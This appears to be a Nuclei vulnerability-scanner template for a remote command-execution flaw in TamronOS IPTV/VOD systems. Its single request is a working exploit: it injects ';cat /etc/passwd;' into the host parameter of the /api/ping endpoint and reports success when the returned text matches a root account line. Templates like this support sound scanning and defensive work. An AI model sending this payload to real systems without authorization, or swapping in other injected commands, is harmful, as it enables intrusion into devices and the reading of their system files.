id: tamronos-rce
info:
  author: pikpikcu
  name: TamronOS IPTV/VOD RCE
  reference: https://twitter.com/sec715/status/1405336456923471874
  severity: critical
  tags: tamronos,rce
requests:
- matchers:
  - regex:
    - root:.*:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp'
